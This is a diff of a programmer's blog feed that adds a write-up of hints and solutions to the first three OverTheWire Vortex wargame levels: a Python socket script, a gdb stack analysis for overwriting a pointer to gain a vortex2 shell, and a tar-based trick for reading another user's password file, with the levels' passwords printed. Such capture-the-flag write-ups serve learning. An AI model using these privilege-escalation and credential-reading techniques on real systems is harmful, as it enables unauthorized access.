@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-12-26T09:36:36-05:00</updated>
+  <updated>2020-12-26T16:52:12-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -14,19 +14,86 @@
 
   
   <entry>
-    <title type="html"><![CDATA[My Solution to Over the Wire Vortex Level 1 -> 2]]></title>
-    <link href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/"/>
+    <title type="html"><![CDATA[My Hints and Solutions to the First Three Levels of Over the Wire Vortex]]></title>
+    <link href="https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex/"/>
     <updated>2020-12-25T20:21:28-05:00</updated>
-    <id>https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2</id>
-    <content type="html"><![CDATA[<p>I recently found a whole new series of online wargames at <a href="https://overthewire.org/">overthewire.org</a>.
-Here&rsquo;s my solution for the second level &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a>&rdquo;</p>
+    <id>https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex</id>
+    <content type="html"><![CDATA[<p>I recently found more wargames at <a href="https://overthewire.org/">overthewire.org</a>. Here are my hints and
+solutions for the first three levels of Vortex. The levels are cumulative. We
+have to beat the previous level in order to access the next.</p>
 
-<p>The levels are cumulative. We have to beat the previous level in order to access the next. This
-solution assumes we have solved &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a>&rdquo; and can SSH into the
-machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
+<h1><a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a></h1>
+
+<p><details>
+  <summary>Hint 1: how much data</summary>
+  Connect to the host and port and read all the bytes you can. How many bytes do you get?
+</details></p>
+
+<p><details>
+  <summary>Hint 2: endianess</summary>
+  &ldquo;&hellip;read in 4 unsigned integers in host byte order&rdquo; means the bytes are
+  already in host byte order or little-endian. If your system is also
+  little-endian, you don&rsquo;t need to do anything special when interpreting the
+  bytes.
+</details></p>
+
+<p><details>
+  <summary>Hint 3: expected reply</summary>
+  How many bytes is each integer? What is the sum of all four?
+</details></p>
 
 <!-- more -->
 
+
+<h2>My solution</h2>
+
+<pre><code class="python">#!/usr/bin/env python3
+
+# Example output
+# got bytes 53 ac 40 65 d4 36 07 63 5b 74 dd 4b 0f b6 cc 4d
+# sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is 5938220433
+# replying with bytes 91 0d f2 61 01 00 00 00
+# Username: vortex1 Password: Gq#qu3bF3
+
+import binascii
+import struct
+import socket
+
+HOST = 'vortex.labs.overthewire.org'
+PORT = 5842
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+r = s.recv(1024)
+print(f'got bytes {r.hex(" ")}')
+
+ba = bytearray(r)
+# Since the machine is a 32-bit system, each integer will be four bytes.
+# So we interpret each integer four bytes at a time.
+int_a = struct.unpack('I', ba[:4])[0]
+int_b = struct.unpack('I', ba[4:8])[0]
+int_c = struct.unpack('I', ba[8:12])[0]
+int_d = struct.unpack('I', ba[12:16])[0]
+
+# Sum all the integers.
+_sum = int_a + int_b + int_c + int_d
+print(f'sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is {_sum}')
+
+# Packing like this seems to take care of endianess by default
+reply_bytes = struct.pack('Q', _sum)
+print(f'replying with bytes {reply_bytes.hex(" ")}')
+s.sendall(reply_bytes)
+r = s.recv(1024)
+print(r.decode('ascii'))
+
+s.close()
+</code></pre>
+
+<h1><a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a></h1>
+
+<p>This solution assumes we have solved the previous level and can SSH into the
+machine as user vortex1. Caveat: the machine is extremely slow.</p>
 
 <p>First let&rsquo;s find out some information about the machine.</p>
 
@@ -65,6 +132,34 @@ x86_64
 </code></pre>
 
 <p>ASLR is disabled.</p>
+
+<p><details>
+  <summary>Hint 1: password location for next level</summary>
+  The instructions don&rsquo;t tell you this, but the password for the next level is
+  located in the directory <code>/etc/vortex_pass</code>.
+</details></p>
+
+<p><details>
+  <summary>Hint 2: required permissions</summary>
+  What are the permissions of the password file for the next level? How can you
+  read this file?
+</details></p>
+
+<p><details>
+  <summary>Hint 3: program source code</summary>
+  What does the program do? Can you see the code path you need to execute to
+  elevate your privileges?
+</details></p>
+
+<p><details>
+  <summary>Hint 4: how to change <code>ptr</code></summary>
+  How can you change the value of <code>ptr</code> to the right value? You shouldn&rsquo;t need
+  to send more than ~300 bytes to the program to do so.
+</details></p>
+
+<h2>My solution</h2>
+
+<p>Let&rsquo;s disassemble the executable to gain some insight into the stack layout.</p>
 
 <pre><code>vortex1@vortex:~$ gdb /vortex/vortex1
 GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
@@ -160,7 +255,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 </code></pre>
 
-<p>We can see that on main+8, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
+<p>At <code>main+8</code>, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
 char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
 we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
 <code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
@@ -236,8 +331,7 @@ id
 uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)
 </code></pre>
 
-<p>The wargame instructions don&rsquo;t tell us this, but each user&rsquo;s password is located in the directory
-below. Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
+<p>Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
 
 <pre><code>ls /etc/vortex_pass
 vortex0   vortex11  vortex14  vortex17  vortex2   vortex22  vortex25  vortex5  vortex8
@@ -246,6 +340,47 @@ vortex10  vortex13  vortex16  vortex19  vortex21  vortex24  vortex4   vortex7
 
 cat /etc/vortex_pass/vortex2
 23anbT\rE
+</code></pre>
+
+<h1><a href="https://overthewire.org/wargames/vortex/vortex2.html">Vortex Level 2 -> Level 3</a></h1>
+
+<p><details>
+  <summary>Hint 1: number of args</summary>
+  You don&rsquo;t need to use all the available <code>argv</code> slots used in the executable.
+</details></p>
+
+<p><details>
+  <summary>Hint 2: <code>$$</code></summary>
+  What is <code>$$</code>? What is its value in the context of the executable?
+</details></p>
+
+<p><details>
+  <summary>Hint 3: file to tar</summary>
+  What file do you need to read? How can you use the program to read it?
+</details></p>
+
+<h2>My solution</h2>
+
+<pre><code>vortex2@vortex:~$ /vortex/vortex2 /etc/vortex_pass/vortex3
+/bin/tar: Removing leading `/' from member names
+
+vortex2@vortex:/etc/vortex_pass$ ls -ail /tmp/ownership.$$.tar
+ls: cannot access /tmp/ownership.1657.tar: No such file or directory
+
+vortex2@vortex:~$ ls -ail /tmp/ownership.\$$.tar
+2670 -rw-rw-r-- 1 vortex3 vortex2 10240 Dec 26 21:15 /tmp/ownership.$$.tar
+
+vortex2@vortex:~$ tar -xvf /tmp/ownership.\$$.tar
+etc/vortex_pass/vortex3
+
+vortex2@vortex:~$ ls -ail etc/vortex_pass/
+total 12
+2808 drwxrwxr-x 2 vortex2 vortex2 4096 Dec 26 21:16 .
+2689 drwxrwxr-x 3 vortex2 vortex2 4096 Dec 26 21:16 ..
+2809 -r-------- 1 vortex2 vortex2   10 Nov  4  2019 vortex3
+
+vortex2@vortex:~$ cat etc/vortex_pass/vortex3
+64ncXTvx#
 </code></pre>
 ]]></content>
   </entry>
